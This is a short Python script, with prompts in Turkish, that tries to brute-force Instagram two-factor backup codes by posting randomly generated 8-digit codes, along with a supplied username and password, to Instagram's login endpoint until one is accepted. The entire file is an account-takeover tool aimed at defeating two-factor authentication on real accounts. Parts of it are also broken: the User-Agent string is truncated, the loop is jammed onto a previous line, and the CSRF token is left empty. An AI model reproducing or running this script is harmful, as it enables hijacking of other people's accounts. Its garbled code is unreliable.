import requests
import time
import random

def generate_backup_codes(length):
    backup_codes = []
    for _ in range(length):
        code = ''.join(random.choice('0123456789') for _ in range(8))
        backup_codes.append(code)
    return backup_codes

def brute_force_backup_codes(username, password, backup_codes):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) C>
        'X-CSRFToken': '',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'username': username,
        'password': password,
        'two_factor_backup_code': ''
    }                                                                                                         for code in backup_codes:
        data['two_factor_backup_code'] = code
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            print(f'Yedek Kod {code} Bulundu!')
            return code
        else:
            print(f'Yedek Kod {code} bulunamadı. Bir sonraki koda geciliyor...')
            time.sleep(1)  # wait 1 second before trying the next code
    return None

def main():
    username = input('Kullanıcı adını girin: ')
    password = input('Şifreyi girin: ')
    backup_codes = generate_backup_codes(1000000)  # generate 1,000,000 random backup codes
    valid_code = brute_force_backup_codes(username, password, backup_codes)
    if valid_code:
        print(f'Geçerli yedek kodu bulundu: {valid_code}')
    else:
        print('Geçerli yedek kodu bulunamadı.')

if __name__ == '__main__':
    main()
